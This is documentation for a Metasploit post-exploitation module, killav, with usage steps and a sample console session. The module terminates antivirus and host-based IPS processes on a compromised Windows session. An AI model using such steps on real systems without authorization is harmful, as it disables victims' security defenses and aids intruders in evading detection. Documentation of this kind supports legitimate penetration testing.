## Vulnerable Application

This module attempts to locate and terminate any processes that are identified
as being Antivirus or Host-based IPS related.

## Verification Steps

1. Start msfconsole
2. Get a session
3. Do: `use post/windows/manage/killav`
4. Do: `set SESSION <session id>`
5. Do: `run`

## Options


## Scenarios

### Windows 7 SP1 (x64)

```
msf6 > use post/windows/manage/killav
msf6 post(windows/manage/killav) > set session 1
session => 1
msf6 post(windows/manage/killav) > run

[*] Attempting to terminate 'antivirus.exe' (PID: 5340) ...
[+] antivirus.exe (PID: 5340) terminated.
[*] Attempting to terminate 'regedit.exe' (PID: 2296) ...
[+] regedit.exe (PID: 2296) terminated.
[+] A total of 2 process(es) were discovered, 2 were terminated.
[*] Post module execution completed
msf6 post(windows/manage/killav) > 
```
